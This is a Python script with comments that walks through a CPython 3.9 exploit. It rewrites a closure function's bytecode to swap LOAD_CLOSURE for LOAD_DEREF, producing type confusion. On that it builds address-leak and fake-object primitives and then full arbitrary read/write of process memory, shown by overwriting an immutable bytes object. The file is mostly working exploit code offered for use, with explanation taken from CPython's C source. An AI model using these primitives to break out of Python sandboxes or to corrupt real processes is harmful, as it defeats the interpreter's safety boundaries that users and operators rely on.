# allows for reading and writing an object to the 3rd pointer of an object
# *(object + 2 * sizeof(c_void_p)) = n
# WARNING: python3 calls `Py_INCREF` and `Py_XDECREF` on passed in and replaced object respectively

# the following code exploits an optimzation in cpython 3.9 bytecode
# by replacing the opcode `LOAD_CLOSURE` (0x87) with `LOAD_DEREF` (0x88)
# this means that python will instead load the value of the closure instead of the closure itself
# it is possible to construct a python function that has an arbitrary object
# that it will use as a closure
# inside that python function, this means that calls to `LOAD_DEREF` (0x88) and `STORE_DEREF` (0x89)
# will attempt to use the arbitrary object as a closure, including reading and writing to
# the third pointer respectively
# this works because cpython uses `PyCell_GET` and `PyCell_SET` macros in these opcode paths
# instead of the type protected functions for optimzation

# C source for reference
# --* Include/cellobject.h *--
# typedef struct {
#     PyObject_HEAD
#     PyObject *ob_ref;
# } PyCellObject;
# #define PyCell_GET PyCell_GET(op) (((PyCellObject *)(op))->ob_ref)
# #define PyCell_SET(op, v) ((void)(((PyCellObject *)(op))->ob_ref = v))

# --* Python/ceval.c *--
# case TARGET(LOAD_DEREF): {
#     PyObject *cell = freevars[oparg];
#     PyObject *value = PyCell_GET(cell);
#     if (value == NULL) {
#         format_exc_unbound(tstate, co, oparg);
#         goto error;
#     }
#     Py_INCREF(value);
#     PUSH(value);
#     DISPATCH();
# }
#
# case TARGET(STORE_DEREF): {
#     PyObject *v = POP();
#     PyObject *cell = freevars[oparg];
#     PyObject *oldobj = PyCell_GET(cell);
#     PyCell_SET(cell, v);
#     Py_XDECREF(oldobj);
#     DISPATCH();
# }

def gadget(n):
    def f(*v):
        nonlocal n
        if v:
            n = v[0]
        else:
            return n
    return f

C = gadget.__code__
gadget.__code__ = C.replace(
    co_code=b'\x88' + C.co_code[1:]
)

def cast(v, t1, t2, bufsize=tuple.__itemsize__):
    # uses `memoryview` to convert an object `v` from type `t1` to type `t2`
    # note that memoryviews can only write to the passed in buffer
    # used in this code to get the double representation of 8 byte ints
    conv = memoryview(bytearray(bufsize))
    conv.cast(t1)[0] = v
    return conv.cast(t2)[0]

def set_obj_at_addr(addr, obj):
    # uses `complex` to build a list-like structure
    gadget(list.__setitem__)(complex)
    list.__setitem__(complex(
        cast(1, 'l', 'd'),
        cast(addr, 'l', 'd')
    ), 0, obj)
    gadget(list.__setitem__)(list)

def get_obj_at_addr(addr):
    # uses `float` as a cell-like structure
    return gadget(cast(addr, 'l', 'd'))()

def addressof(obj):
    # uses `float` as a cell-like structure
    r = 0.0
    gadget(r)(obj)
    return cast(r, 'd', 'l')

# from here you can get full python process memory r/w
# by constructing a fake bytearray that points from 0 to 2**63-1 and using `get_obj_at_addr`
# to load it. subsequent `fake_bytearray[addr]` will be able to read and write single bytes
# you can also write to a slice `fake_bytearray[addr: addr + size]` to write `size` bytes at once

# example:
memory_backing = bytes(8) \
               + addressof(bytearray).to_bytes(8, 'little') \
               + bytes([255] * (7) + [127]) \
               + bytes(32)

memory = get_obj_at_addr(addressof(memory_backing) + bytes.__basicsize__ - 1)

bytes_obj = b'hello world'
print(bytes_obj)
addr = addressof(bytes_obj) + bytes.__basicsize__ - 1
memory[addr: addr + len(bytes_obj)] = b'overwritten'
print(bytes_obj)
